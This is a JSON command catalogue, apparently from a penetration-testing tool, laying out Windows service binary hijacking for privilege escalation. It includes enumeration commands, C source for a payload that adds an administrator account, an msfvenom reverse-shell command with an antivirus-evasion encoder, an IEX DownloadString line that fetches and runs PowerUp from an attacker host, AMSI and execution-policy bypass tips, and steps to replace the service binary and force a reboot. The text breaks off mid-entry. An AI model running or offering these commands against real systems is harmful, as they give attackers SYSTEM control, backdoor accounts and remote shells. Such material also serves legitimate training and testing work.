{
  "category": "post-exploit",
  "subcategory": "service-binary-hijacking",
  "description": "Windows Service Binary Hijacking privilege escalation commands for identifying writable service binaries and exploiting them to gain SYSTEM privileges",
  "metadata": {
    "educational_context": "Service binary hijacking exploits misconfigured file permissions on service executables. When low-privilege users have write access to a service binary, they can replace it with a malicious payload that executes with the service's privileges (often SYSTEM).",
    "prerequisites": [
      "Initial shell as low-privilege user",
      "Target has user-installed services (non-Windows paths)",
      "Service runs as SYSTEM or high-privilege account"
    ],
    "attack_chain": "Enumerate services -> Check binary permissions -> Identify writable binary -> Create payload -> Replace binary -> Restart service/reboot -> Verify escalation"
  },
  "commands": [
    {
      "id": "win-service-binary-enum-running",
      "name": "Enumerate Running Services with Binary Paths",
      "category": "post-exploit",
      "subcategory": "service-binary-hijacking",
      "command": "Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}",
      "description": "List all running Windows services with their binary paths using WMI. Focus on non-Windows paths (C:\\xampp, C:\\Program Files\\CustomApp) as these are more likely misconfigured.",
      "variables": [],
      "flag_explanations": {
        "Get-CimInstance": "Modern PowerShell cmdlet to query WMI classes (supersedes Get-WmiObject)",
        "-ClassName win32_service": "Query the Win32_Service WMI class containing all service information",
        "Select Name,State,PathName": "Return only service name, current state, and binary path",
        "Where-Object {$_.State -like 'Running'}": "Filter to show only services currently in Running state"
      },
      "tags": [
        "ENUMERATION",
        "POST_EXPLOITATION",
        "POWERSHELL",
        "PRIVILEGE_ESCALATION",
        "SERVICE_HIJACKING",
        "WINDOWS",
        "WMI"
      ],
      "success_indicators": [
        "Name",
        "State",
        "PathName",
        "Running",
        "C:\\xampp",
        "C:\\Program Files"
      ],
      "failure_indicators": [
        "Access denied",
        "Get-CimInstance: command not found",
        "permission denied"
      ],
      "next_steps": [
        "win-icacls-binary-check",
        "win-service-startmode-check",
        "win-sc-query-config"
      ],
      "alternatives": [
        "win-wmic-service-path",
        "win-ps-get-service-details"
      ],
      "prerequisites": [],
      "notes": "CRITICAL for service binary hijacking enumeration.\n\nFocus on services with paths OUTSIDE C:\\Windows\\System32:\n- C:\\xampp\\ (XAMPP stack)\n- C:\\Program Files\\<CustomApp>\\\n- C:\\inetpub\\\n- Any user-installed software\n\nThese are more likely to have weak permissions because administrators set Full Access to avoid permission problems during installation.\n\nIMPORTANT: Using network logon (WinRM, bind shell) may result in 'permission denied'. Use interactive logon (RDP) if possible.\n\nTime estimate: 5 seconds\n\nManual alternative (CMD):\nwmic service get Name,PathName,State | findstr Running",
      "educational": {
        "purpose": "Identify services with binary paths outside protected Windows directories that may have exploitable permissions",
        "manual_alternative": "wmic service get Name,PathName,State | findstr Running",
        "common_failures": [
          "Permission denied with non-interactive logon (use RDP instead)",
          "Empty output if no services running"
        ],
        "when_to_use": [
          "Initial privilege escalation enumeration",
          "After gaining shell on Windows target",
          "When looking for user-installed services"
        ],
        "time_estimate": "5 seconds",
        "technical_notes": [
          "Get-CimInstance uses DCOM/WinRM for remote queries",
          "win32_service WMI class contains service configuration",
          "PathName includes command-line arguments"
        ]
      },
      "troubleshooting": {
        "Access denied": "Try from RDP session instead of reverse shell. Network logons have restricted WMI access.",
        "Get-CimInstance not found": "Use Get-WmiObject (older systems) or wmic command instead",
        "Empty results": "No running services or insufficient permissions. Try: Get-Service"
      },
      "methodology_guidance": {
        "after_success": "For each non-Windows path found, check binary permissions with icacls. Look for services running from C:\\xampp, custom application directories, or paths with spaces."
      }
    },
    {
      "id": "win-icacls-binary-check",
      "name": "Check Service Binary File Permissions",
      "category": "post-exploit",
      "subcategory": "service-binary-hijacking",
      "command": "icacls \"<BINARY_PATH>\"",
      "description": "Check file permissions on a service binary using icacls. Look for Full (F), Modify (M), or Write (W) permissions for BUILTIN\\Users, Everyone, or Authenticated Users groups.",
      "variables": [
        {
          "name": "<BINARY_PATH>",
          "description": "Full path to the service executable",
          "example": "C:\\xampp\\mysql\\bin\\mysqld.exe",
          "required": true,
          "common_values": [
            "C:\\xampp\\apache\\bin\\httpd.exe",
            "C:\\xampp\\mysql\\bin\\mysqld.exe",
            "C:\\Program Files\\CustomApp\\service.exe"
          ]
        }
      ],
      "flag_explanations": {
        "icacls": "Windows command to display or modify discretionary access control lists (DACLs)",
        "\"<BINARY_PATH>\"": "Path to file - quotes required for paths with spaces"
      },
      "tags": [
        "ENUMERATION",
        "ICACLS",
        "PERMISSIONS",
        "POST_EXPLOITATION",
        "PRIVILEGE_ESCALATION",
        "SERVICE_HIJACKING",
        "WINDOWS"
      ],
      "success_indicators": [
        "BUILTIN\\Users:(F)",
        "BUILTIN\\Users:(M)",
        "BUILTIN\\Users:(W)",
        "Everyone:(F)",
        "Everyone:(M)",
        "Authenticated Users:(F)",
        "Successfully processed"
      ],
      "failure_indicators": [
        "BUILTIN\\Users:(RX)",
        "Access is denied",
        "The system cannot find the file"
      ],
      "next_steps": [
        "win-cross-compile-adduser",
        "win-msfvenom-service-exe",
        "win-service-binary-replace"
      ],
      "alternatives": [
        "win-get-acl-check"
      ],
      "prerequisites": [
        "win-service-binary-enum-running"
      ],
      "notes": "CRITICAL permission check for service binary hijacking.\n\nPermission Mask Reference:\n  F  = Full access (can read, write, execute, delete, change permissions)\n  M  = Modify access (can read, write, execute, delete)\n  RX = Read and execute (NOT exploitable)\n  R  = Read-only (NOT exploitable)\n  W  = Write-only (exploitable - can replace file)\n\nVulnerable if you see:\n  BUILTIN\\Users:(F)  - Full control for all users\n  BUILTIN\\Users:(M)  - Modify access for all users\n  Everyone:(F)       - Full control for everyone\n  NT AUTHORITY\\Authenticated Users:(M) - Modify for authenticated users\n\n(I) prefix indicates inherited permission from parent folder.\nNo (I) means permission was explicitly set on this file.\n\nTime estimate: 2 seconds\n\nPowerShell alternative:\nGet-Acl \"<PATH>\" | Format-List",
      "educational": {
        "purpose": "Determine if current user can write/modify the service binary to replace it with malicious payload",
        "manual_alternative": "Get-Acl \"<PATH>\" | Format-List",
        "common_failures": [
          "File path doesn't exist (typo or service not installed)",
          "Access denied viewing ACL (rare)"
        ],
        "when_to_use": [
          "After identifying service with non-Windows binary path",
          "Verifying if binary can be replaced",
          "Before attempting exploitation"
        ],
        "time_estimate": "2 seconds",
        "technical_notes": [
          "icacls shows both explicit and inherited permissions",
          "(I) prefix = inherited from parent directory",
          "Missing (I) = explicitly set permission (more reliable)",
          "BUILTIN\\Users includes all local user accounts"
        ]
      },
      "troubleshooting": {
        "Access is denied": "Need at least read permissions on the file/directory",
        "File not found": "Verify path from service enumeration - may include arguments",
        "Only (RX) permissions shown": "Not exploitable via binary replacement - try DLL hijacking or unquoted path instead"
      },
      "filled_example": "icacls \"C:\\xampp\\mysql\\bin\\mysqld.exe\""
    },
    {
      "id": "win-service-startmode-check",
      "name": "Check Service Startup Type (Auto/Manual)",
      "category": "post-exploit",
      "subcategory": "service-binary-hijacking",
      "command": "Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like '<SERVICE_NAME>'}",
      "description": "Check if a service is configured for automatic startup. If Auto, the malicious binary will execute on reboot without needing manual service restart permissions.",
      "variables": [
        {
          "name": "<SERVICE_NAME>",
          "description": "Name of the service to check",
          "example": "mysql",
          "required": true,
          "common_values": [
            "mysql",
            "Apache2.4",
            "PostgreSQL"
          ]
        }
      ],
      "flag_explanations": {
        "Get-CimInstance -ClassName win32_service": "Query WMI for service information",
        "Select Name, StartMode": "Return service name and startup configuration",
        "Where-Object {$_.Name -like '<SERVICE_NAME>'}": "Filter for specific service name"
      },
      "tags": [
        "ENUMERATION",
        "POST_EXPLOITATION",
        "POWERSHELL",
        "PRIVILEGE_ESCALATION",
        "SERVICE_HIJACKING",
        "WINDOWS"
      ],
      "success_indicators": [
        "StartMode",
        "Auto",
        "Name"
      ],
      "failure_indicators": [
        "Manual",
        "Disabled",
        "No matching service"
      ],
      "next_steps": [
        "win-whoami-shutdown-priv",
        "win-net-stop-service",
        "win-shutdown-reboot"
      ],
      "alternatives": [
        "win-sc-query-config"
      ],
      "prerequisites": [
        "win-service-binary-enum-running"
      ],
      "notes": "CRITICAL: Determines exploitation strategy.\n\nStartMode values:\n  Auto     = Service starts automatically at boot (GOOD - reboot triggers payload)\n  Manual   = Service must be started manually (need restart permissions)\n  Disabled = Service won't start (NOT exploitable unless re-enabled)\n\nWhy this matters:\n- If Auto: Can trigger payload via system reboot\n- If Manual: Need permissions to restart service (usually admin only)\n\nMost user-installed services (MySQL, Apache, custom apps) are set to Auto.\n\nTime estimate: 2 seconds\n\nCMD alternative:\nsc qc <SERVICE_NAME> | findstr START_TYPE",
      "educational": {
        "purpose": "Determine if system reboot will trigger malicious service binary execution",
        "manual_alternative": "sc qc <SERVICE_NAME> | findstr START_TYPE",
        "common_failures": [
          "Service name mismatch (use exact name from enumeration)"
        ],
        "when_to_use": [
          "After confirming writable service binary",
          "Before determining restart method",
          "Planning exploitation timeline"
        ],
        "time_estimate": "2 seconds",
        "technical_notes": [
          "Auto services start during boot sequence",
          "Reboot is often only option if can't restart service directly"
        ]
      },
      "troubleshooting": {
        "No results": "Service name is case-sensitive or doesn't exist. Use: Get-Service | Where-Object {$_.Name -like '*<partial>*'}",
        "StartMode is Manual": "Need admin rights to restart, or find different service"
      },
      "filled_example": "Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}"
    },
    {
      "id": "win-whoami-shutdown-priv",
      "name": "Check SeShutdownPrivilege for Reboot Capability",
      "category": "post-exploit",
      "subcategory": "service-binary-hijacking",
      "command": "whoami /priv",
      "description": "List all privileges assigned to current user. Look for SeShutdownPrivilege which allows initiating system reboot to trigger auto-start service exploitation.",
      "variables": [],
      "flag_explanations": {
        "whoami": "Display current user information",
        "/priv": "Show all privileges assigned to the user's token"
      },
      "tags": [
        "ENUMERATION",
        "POST_EXPLOITATION",
        "PRIVILEGE_ESCALATION",
        "SERVICE_HIJACKING",
        "WINDOWS"
      ],
      "success_indicators": [
        "SeShutdownPrivilege",
        "Shut down the system",
        "Enabled",
        "Disabled"
      ],
      "failure_indicators": [
        "SeShutdownPrivilege not in list"
      ],
      "next_steps": [
        "win-shutdown-reboot",
        "win-service-binary-replace"
      ],
      "alternatives": [],
      "prerequisites": [],
      "notes": "SeShutdownPrivilege is required to initiate system reboot.\n\nState explanation:\n  Enabled  = Privilege currently active\n  Disabled = Privilege assigned but not currently active\n\nIMPORTANT: 'Disabled' state just means not in use - the user CAN still reboot!\nThe privilege being PRESENT (even if Disabled) means you can use shutdown command.\n\nIf SeShutdownPrivilege is NOT listed at all:\n- Cannot reboot system\n- Must find way to restart service manually\n- May need to wait for admin to reboot\n\nMost standard users have SeShutdownPrivilege.\n\nTime estimate: 1 second\n\nAlso check for other useful privileges:\n  SeImpersonatePrivilege - Potato exploits (faster path to SYSTEM)\n  SeDebugPrivilege - Process memory access",
      "educational": {
        "purpose": "Confirm ability to reboot system for triggering auto-start service exploitation",
        "manual_alternative": "No alternative - whoami /priv is the standard method",
        "common_failures": [
          "Privilege not assigned (restricted service account)"
        ],
        "when_to_use": [
          "After confirming service is auto-start",
          "Before planning exploitation timing",
          "When direct service restart fails"
        ],
        "time_estimate": "1 second",
        "technical_notes": [
          "Disabled state doesn't prevent usage - just means not currently active",
          "Privilege must be PRESENT in list to use it",
          "Standard users typically have SeShutdownPrivilege"
        ]
      },
      "troubleshooting": {
        "SeShutdownPrivilege not listed": "User cannot reboot - need different escalation path or wait for admin reboot",
        "All privileges Disabled": "Normal - privileges activate on use, presence is what matters"
      }
    },
    {
      "id": "win-net-stop-service",
      "name": "Attempt to Stop Service (Requires Admin)",
      "category": "post-exploit",
      "subcategory": "service-binary-hijacking",
      "command": "net stop <SERVICE_NAME>",
      "description": "Attempt to stop a Windows service. Usually requires administrator privileges. If 'Access is denied', fall back to reboot method.",
      "variables": [
        {
          "name": "<SERVICE_NAME>",
          "description": "Name of the service to stop",
          "example": "mysql",
          "required": true
        }
      ],
      "flag_explanations": {
        "net stop": "Windows command to stop a running service",
        "<SERVICE_NAME>": "Service name (not display name)"
      },
      "tags": [
        "POST_EXPLOITATION",
        "PRIVILEGE_ESCALATION",
        "SERVICE_HIJACKING",
        "WINDOWS"
      ],
      "success_indicators": [
        "was stopped successfully",
        "service is not started"
      ],
      "failure_indicators": [
        "System error 5",
        "Access is denied",
        "service is not started"
      ],
      "next_steps": [
        "win-net-start-service",
        "win-shutdown-reboot"
      ],
      "alternatives": [
        "win-sc-stop-service"
      ],
      "prerequisites": [
        "win-service-binary-replace"
      ],
      "notes": "Usually fails for low-privilege users.\n\nExpected behavior:\n  Success = 'The <service> service was stopped successfully'\n  Failure = 'System error 5 has occurred. Access is denied.'\n\nIf access denied:\n  1. Verify service is Auto-start\n  2. Check SeShutdownPrivilege\n  3. Use reboot method instead\n\nsc.exe alternative:\n  sc stop <SERVICE_NAME>\n\nTime estimate: 2 seconds",
      "educational": {
        "purpose": "Attempt direct service restart after binary replacement",
        "manual_alternative": "sc stop <SERVICE_NAME>",
        "common_failures": [
          "Access denied (expected for low-priv user)",
          "Service dependencies prevent stop"
        ],
        "when_to_use": [
          "After replacing service binary",
          "Before falling back to reboot method"
        ],
        "time_estimate": "2 seconds"
      },
      "troubleshooting": {
        "Access is denied": "Expected for non-admin users. Use reboot method if SeShutdownPrivilege available.",
        "Service has dependent services": "Stop dependent services first or use reboot"
      },
      "filled_example": "net stop mysql"
    },
    {
      "id": "win-net-start-service",
      "name": "Start Service After Stop",
      "category": "post-exploit",
      "subcategory": "service-binary-hijacking",
      "command": "net start <SERVICE_NAME>",
      "description": "Start a Windows service after stopping it. If both stop and start succeed, malicious binary executes immediately.",
      "variables": [
        {
          "name": "<SERVICE_NAME>",
          "description": "Name of the service to start",
          "example": "mysql",
          "required": true
        }
      ],
      "flag_explanations": {
        "net start": "Windows command to start a stopped service",
        "<SERVICE_NAME>": "Service name (not display name)"
      },
      "tags": [
        "POST_EXPLOITATION",
        "PRIVILEGE_ESCALATION",
        "SERVICE_HIJACKING",
        "WINDOWS"
      ],
      "success_indicators": [
        "was started successfully",
        "service is already running"
      ],
      "failure_indicators": [
        "System error 5",
        "Access is denied"
      ],
      "next_steps": [
        "win-localgroup-admins-check",
        "win-verify-new-user"
      ],
      "prerequisites": [
        "win-net-stop-service"
      ],
      "notes": "Execute immediately after net stop if successful.\n\nAfter service starts with replaced binary:\n- Adduser payload: Check 'net localgroup administrators'\n- Reverse shell payload: Check listener for callback\n\nTime estimate: 2 seconds",
      "educational": {
        "purpose": "Trigger execution of replaced malicious service binary",
        "manual_alternative": "sc start <SERVICE_NAME>",
        "time_estimate": "2 seconds"
      },
      "filled_example": "net start mysql"
    },
    {
      "id": "win-shutdown-reboot",
      "name": "Reboot System to Trigger Auto-Start Service",
      "category": "post-exploit",
      "subcategory": "service-binary-hijacking",
      "command": "shutdown /r /t 0",
      "description": "Initiate immediate system reboot. Used when cannot manually restart service but service is configured for auto-start. Requires SeShutdownPrivilege.",
      "variables": [],
      "flag_explanations": {
        "shutdown": "Windows shutdown utility",
        "/r": "Reboot after shutdown (instead of power off)",
        "/t 0": "Timeout in seconds before action (0 = immediate)"
      },
      "tags": [
        "POST_EXPLOITATION",
        "PRIVILEGE_ESCALATION",
        "SERVICE_HIJACKING",
        "WINDOWS"
      ],
      "success_indicators": [
        "System rebooting",
        "Connection lost"
      ],
      "failure_indicators": [
        "Access is denied",
        "privilege is not held"
      ],
      "next_steps": [
        "win-localgroup-admins-check"
      ],
      "prerequisites": [
        "win-service-binary-replace",
        "win-service-startmode-check",
        "win-whoami-shutdown-priv"
      ],
      "notes": "WARNING: Only use reboot in controlled environments!\n\nIn real penetration tests:\n- Coordinate with client IT staff\n- Avoid production systems if possible\n- Reboots are logged and noticeable\n- System may not come back up (rare but possible)\n\nFor certification exam: Reboots are acceptable since they're lab machines.\n\nAfter reboot:\n1. Reconnect via RDP or reverse shell\n2. Verify exploitation succeeded\n3. Check if user was created or shell connected\n\nScheduled reboot alternative:\n  shutdown /r /t 60 (reboot in 60 seconds)\n\nCancel scheduled reboot:\n  shutdown /a\n\nTime estimate: 1-3 minutes for full reboot cycle",
      "educational": {
        "purpose": "Trigger auto-start service execution after binary replacement",
        "manual_alternative": "shutdown /r /t 60 (with delay for preparation)",
        "common_failures": [
          "Access denied (SeShutdownPrivilege missing)",
          "System fails to boot (rare)"
        ],
        "when_to_use": [
          "After service binary replaced",
          "When direct service restart denied",
          "Service is Auto-start mode"
        ],
        "time_estimate": "1-3 minutes",
        "technical_notes": [
          "Requires SeShutdownPrivilege",
          "Service starts during boot sequence",
          "Network connections lost during reboot"
        ]
      },
      "troubleshooting": {
        "Access is denied": "User lacks SeShutdownPrivilege - need different approach",
        "System won't reconnect": "Wait longer, check if system actually booted, verify network connectivity"
      }
    },
    {
      "id": "win-service-binary-replace",
      "name": "Replace Service Binary with Malicious Payload",
      "category": "post-exploit",
      "subcategory": "service-binary-hijacking",
      "command": "move <ORIGINAL_PATH> <BACKUP_PATH> && move <PAYLOAD_PATH> <ORIGINAL_PATH>",
      "description": "Backup original service binary and replace with malicious payload. Uses move command for atomic operation.",
      "variables": [
        {
          "name": "<ORIGINAL_PATH>",
          "description": "Full path to original service binary",
          "example": "C:\\xampp\\mysql\\bin\\mysqld.exe",
          "required": true
        },
        {
          "name": "<BACKUP_PATH>",
          "description": "Path to store original binary backup",
          "example": "C:\\Users\\dave\\mysqld.exe.bak",
          "required": true
        },
        {
          "name": "<PAYLOAD_PATH>",
          "description": "Path to malicious binary to use as replacement",
          "example": "C:\\Users\\dave\\adduser.exe",
          "required": true
        }
      ],
      "flag_explanations": {
        "move": "Rename/move file (atomic operation, preserves timestamps better than copy)",
        "&&": "Execute second command only if first succeeds"
      },
      "tags": [
        "EXPLOITATION",
        "POST_EXPLOITATION",
        "PRIVILEGE_ESCALATION",
        "SERVICE_HIJACKING",
        "WINDOWS"
      ],
      "success_indicators": [
        "1 file(s) moved"
      ],
      "failure_indicators": [
        "Access is denied",
        "The process cannot access the file",
        "file is being used"
      ],
      "next_steps": [
        "win-net-stop-service",
        "win-shutdown-reboot"
      ],
      "prerequisites": [
        "win-icacls-binary-check",
        "win-cross-compile-adduser"
      ],
      "notes": "ALWAYS backup original binary!\n\nBest practice workflow:\n1. Backup original: move C:\\path\\service.exe C:\\Users\\you\\service.exe.bak\n2. Transfer payload to target\n3. Replace binary: move C:\\Users\\you\\payload.exe C:\\path\\service.exe\n4. Restart service or reboot\n5. Verify exploitation\n6. Restore original: move C:\\Users\\you\\service.exe.bak C:\\path\\service.exe\n\nPowerShell alternative:\n  Move-Item -Path \"<ORIGINAL>\" -Destination \"<BACKUP>\"\n  Move-Item -Path \"<PAYLOAD>\" -Destination \"<ORIGINAL>\"\n\nIf 'file is being used':\n- Service is currently running\n- Try stopping service first (if possible)\n- Some services can have binary replaced while running\n\nTime estimate: 5 seconds",
      "educational": {
        "purpose": "Replace legitimate service binary with malicious payload",
        "manual_alternative": "copy commands work but move is cleaner",
        "common_failures": [
          "Access denied (binary not writable - verify icacls)",
          "File in use (service running - stop first if possible)"
        ],
        "when_to_use": [
          "After confirming writable permissions",
          "After transferring payload to target"
        ],
        "time_estimate": "5 seconds"
      },
      "troubleshooting": {
        "Access is denied": "Double-check permissions with icacls - may not actually be writable",
        "File is being used": "Service has binary locked. Some services allow replacement while running, try anyway then restart.",
        "Cannot find file": "Verify exact path from service enumeration"
      },
      "filled_example": "move C:\\xampp\\mysql\\bin\\mysqld.exe C:\\Users\\dave\\mysqld.exe.bak && move C:\\Users\\dave\\adduser.exe C:\\xampp\\mysql\\bin\\mysqld.exe"
    },
    {
      "id": "win-cross-compile-adduser",
      "name": "Cross-Compile Adduser Payload (Kali)",
      "category": "post-exploit",
      "subcategory": "service-binary-hijacking",
      "command": "x86_64-w64-mingw32-gcc adduser.c -o adduser.exe",
      "description": "Cross-compile C source code to Windows 64-bit executable on Kali Linux. Creates payload that adds local admin user when executed by service.",
      "variables": [],
      "flag_explanations": {
        "x86_64-w64-mingw32-gcc": "MinGW-w64 cross-compiler for 64-bit Windows targets",
        "adduser.c": "Source file containing adduser code",
        "-o adduser.exe": "Output filename for compiled executable"
      },
      "tags": [
        "CROSS_COMPILE",
        "KALI",
        "MINGW",
        "PAYLOAD",
        "PRIVILEGE_ESCALATION",
        "SERVICE_HIJACKING"
      ],
      "success_indicators": [
        "No output (success)",
        "adduser.exe created"
      ],
      "failure_indicators": [
        "undefined reference",
        "command not found",
        "error:"
      ],
      "next_steps": [
        "win-transfer-payload",
        "win-service-binary-replace"
      ],
      "alternatives": [
        "win-msfvenom-service-exe"
      ],
      "prerequisites": [],
      "notes": "Run on Kali Linux, NOT on Windows target.\n\nSource code template (save as adduser.c):\n```c\n#include <stdlib.h>\n\nint main() {\n  int i;\n  i = system(\"net user dave2 password123! /add\");\n  i = system(\"net localgroup administrators dave2 /add\");\n  return 0;\n}\n```\n\nFor 32-bit targets:\n  i686-w64-mingw32-gcc adduser.c -o adduser.exe\n\nInstall mingw-w64 if missing:\n  sudo apt install mingw-w64\n\nAdvantages over msfvenom:\n- Smaller file size\n- Less likely to trigger AV\n- Customizable actions\n- No network callback required\n\nTime estimate: 2 seconds\n\nVerify compilation:\n  file adduser.exe\n  Should show: PE32+ executable (console) x86-64, for MS Windows",
      "educational": {
        "purpose": "Create custom Windows payload for service binary hijacking",
        "manual_alternative": "Use msfvenom for reverse shell instead",
        "common_failures": [
          "mingw-w64 not installed",
          "Wrong architecture (32-bit vs 64-bit)",
          "Syntax errors in C code"
        ],
        "when_to_use": [
          "When network callback not possible/desired",
          "When avoiding AV detection",
          "For simple user creation payload"
        ],
        "time_estimate": "2 seconds",
        "technical_notes": [
          "x86_64 = 64-bit target",
          "i686 = 32-bit target",
          "MinGW creates native Windows executables from Linux"
        ]
      },
      "troubleshooting": {
        "command not found": "Install mingw-w64: sudo apt install mingw-w64",
        "undefined reference to system": "Missing stdlib.h include",
        "Wrong architecture": "Check target with systeminfo - use i686-w64-mingw32-gcc for 32-bit"
      }
    },
    {
      "id": "win-msfvenom-service-exe",
      "name": "Generate Reverse Shell Service Payload (msfvenom)",
      "category": "post-exploit",
      "subcategory": "service-binary-hijacking",
      "command": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o service.exe",
      "description": "Generate Windows reverse shell executable using msfvenom. Alternative to custom C payload when reverse shell callback is preferred.",
      "variables": [
        {
          "name": "<LHOST>",
          "description": "Attacker's IP address for reverse connection",
          "example": "192.168.45.5",
          "required": true
        },
        {
          "name": "<LPORT>",
          "description": "Attacker's listening port",
          "example": "4444",
          "required": true
        }
      ],
      "flag_explanations": {
        "-p windows/x64/shell_reverse_tcp": "Payload: Windows 64-bit reverse TCP shell",
        "LHOST=": "Listener host (attacker IP)",
        "LPORT=": "Listener port",
        "-f exe": "Output format: Windows executable",
        "-o service.exe": "Output filename"
      },
      "tags": [
        "MSFVENOM",
        "PAYLOAD",
        "PRIVILEGE_ESCALATION",
        "REVERSE_SHELL",
        "SERVICE_HIJACKING"
      ],
      "success_indicators": [
        "Payload size:",
        "Saved as:"
      ],
      "failure_indicators": [
        "Invalid payload",
        "Framework not loaded"
      ],
      "next_steps": [
        "win-transfer-payload",
        "win-service-binary-replace",
        "nc-listener-start"
      ],
      "alternatives": [
        "win-cross-compile-adduser"
      ],
      "prerequisites": [],
      "notes": "Run on Kali Linux.\n\nStart listener BEFORE triggering payload:\n  nc -lvnp <LPORT>\n\nPayload variations:\n  32-bit: windows/shell_reverse_tcp (no x64)\n  Meterpreter: windows/x64/meterpreter/reverse_tcp\n  Staged: windows/x64/shell/reverse_tcp\n\nAV Evasion (if needed):\n  msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -e x64/xor_dynamic -o service.exe\n\nService will fail to start properly (reverse shell doesn't return like service binary should), but shell connects before failure.\n\nTime estimate: 5 seconds generation + service restart time\n\nMore reliable for services: Use adduser.c approach which executes and exits cleanly.",
      "educational": {
        "purpose": "Generate reverse shell payload for service binary hijacking",
        "manual_alternative": "Cross-compile custom C code with reverse shell",
        "common_failures": [
          "AV detection blocks payload",
          "Wrong architecture (32/64 bit mismatch)",
          "Firewall blocks reverse connection"
        ],
        "when_to_use": [
          "When immediate SYSTEM shell preferred",
          "When network allows reverse connections",
          "Quick exploitation without custom code"
        ],
        "time_estimate": "5 seconds"
      },
      "troubleshooting": {
        "No callback received": "Check firewall, verify LHOST/LPORT, ensure listener started before payload",
        "Service fails after connection": "Expected - reverse shell doesn't behave like proper service",
        "AV blocks payload": "Use encoder (-e) or custom C payload instead"
      },
      "filled_example": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.5 LPORT=4444 -f exe -o service.exe"
    },
    {
      "id": "win-localgroup-admins-check",
      "name": "Verify User Added to Administrators Group",
      "category": "post-exploit",
      "subcategory": "service-binary-hijacking",
      "command": "Get-LocalGroupMember administrators",
      "description": "List members of local Administrators group to verify adduser payload successfully created and added user.",
      "variables": [],
      "flag_explanations": {
        "Get-LocalGroupMember": "PowerShell cmdlet to list group members",
        "administrators": "Built-in local Administrators group"
      },
      "tags": [
        "POST_EXPLOITATION",
        "POWERSHELL",
        "PRIVILEGE_ESCALATION",
        "SERVICE_HIJACKING",
        "VERIFICATION",
        "WINDOWS"
      ],
      "success_indicators": [
        "dave2",
        "User",
        "PrincipalSource"
      ],
      "failure_indicators": [
        "User not in list",
        "Access denied"
      ],
      "next_steps": [
        "win-runas-new-admin",
        "win-ps-credential-new-admin"
      ],
      "prerequisites": [
        "win-shutdown-reboot"
      ],
      "notes": "Run after service restart/reboot.\n\nExpected output if successful:\n  ObjectClass Name                      PrincipalSource\n  ----------- ----                      ---------------\n  User        <HOSTNAME>\\dave2          Local\n\nIf user NOT present:\n- Binary may not have executed\n- Service may run as non-SYSTEM account\n- AV may have blocked execution\n- Check Event Viewer for service errors\n\nCMD alternative:\n  net localgroup administrators\n\nTime estimate: 1 second",
      "educational": {
        "purpose": "Confirm successful privilege escalation via adduser payload",
        "manual_alternative": "net localgroup administrators",
        "common_failures": [
          "User not created (payload didn't execute)",
          "Access denied viewing group"
        ],
        "when_to_use": [
          "After service restart/reboot",
          "Verifying adduser payload success"
        ],
        "time_estimate": "1 second"
      },
      "troubleshooting": {
        "New user not present": "Check Event Viewer > Windows Logs > System for service errors",
        "Access denied": "Still low-priv - exploitation failed"
      }
    },
    {
      "id": "win-powerup-modifiable-service",
      "name": "PowerUp - Find Modifiable Service Binaries",
      "category": "post-exploit",
      "subcategory": "service-binary-hijacking",
      "command": "Get-ModifiableServiceFile",
      "description": "PowerUp.ps1 function to automatically identify services where current user can modify the service binary. Quick automated check for service binary hijacking.",
      "variables": [],
      "flag_explanations": {
        "Get-ModifiableServiceFile": "PowerUp function that enumerates services, checks binary permissions, and returns exploitable targets"
      },
      "tags": [
        "AUTOMATED",
        "POST_EXPLOITATION",
        "POWERSHELL",
        "POWERUP",
        "PRIVILEGE_ESCALATION",
        "SERVICE_HIJACKING",
        "WINDOWS"
      ],
      "success_indicators": [
        "ServiceName",
        "Path",
        "ModifiableFile",
        "ModifiableFilePermissions",
        "StartName",
        "AbuseFunction"
      ],
      "failure_indicators": [
        "No results",
        "Access denied",
        "cannot be loaded"
      ],
      "next_steps": [
        "win-powerup-install-service-binary",
        "win-icacls-binary-check"
      ],
      "prerequisites": [
        "win-powerup-import"
      ],
      "notes": "Requires PowerUp.ps1 to be loaded first:\n  . .\\PowerUp.ps1\n  OR\n  IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/PowerUp.ps1')\n\nOutput fields explained:\n  ServiceName: Name of vulnerable service\n  Path: Full binary path with arguments\n  ModifiableFile: Specific file that's writable\n  ModifiableFilePermissions: Permissions granted (WriteOwner, Delete, etc.)\n  ModifiableFileIdentityReference: Principal with permissions (BUILTIN\\Users)\n  StartName: Account service runs as (LocalSystem = SYSTEM)\n  AbuseFunction: Suggested exploitation function\n  CanRestart: Whether current user can restart service\n\nKNOWN BUG: PowerUp's Install-ServiceBinary may fail if service path contains arguments with paths (e.g., --defaults-file=c:\\xampp\\mysql\\bin\\my.ini).\nWorkaround: Use manual exploitation when AbuseFunction fails.\n\nTime estimate: 10-30 seconds\n\nBypass execution policy:\n  powershell -ep bypass\n  . .\\PowerUp.ps1\n  Get-ModifiableServiceFile",
      "educational": {
        "purpose": "Automated detection of exploitable service binaries",
        "manual_alternative": "Manual: Get-CimInstance + icacls for each service",
        "common_failures": [
          "Script blocked by execution policy (use -ep bypass)",
          "AMSI blocks script (use bypass or obfuscation)",
          "False negatives with complex service paths"
        ],
        "when_to_use": [
          "Initial privilege escalation enumeration",
          "Quick automated check before manual enum"
        ],
        "time_estimate": "10-30 seconds",
        "technical_notes": [
          "PowerUp may miss some vulnerabilities (see known bug)",
          "Always verify findings manually before exploitation"
        ]
      },
      "troubleshooting": {
        "Script cannot be loaded": "Use: powershell -ep bypass",
        "AMSI blocks script": "Need AMSI bypass before loading PowerUp",
        "No results but manual check shows vulnerability": "Known PowerUp bug - use manual exploitation",
        "AbuseFunction fails": "Service path contains arguments with paths - use manual method"
      }
    },
    {
      "id": "win-powerup-install-service-binary",
      "name": "PowerUp - Automatic Service Binary Exploitation",
      "category": "post-exploit",
      "subcategory": "service-binary-hijacking",
      "command": "Install-ServiceBinary -Name '<SERVICE_NAME>'",
      "description": "PowerUp function to automatically exploit writable service binary. Creates local admin user john:Password123! by default.",
      "variables": [
        {
          "name": "<SERVICE_NAME>",
          "description": "Name of the vulnerable service from Get-ModifiableServiceFile",
          "example": "mysql",
          "required": true
        }
      ],
      "flag_explanations": {
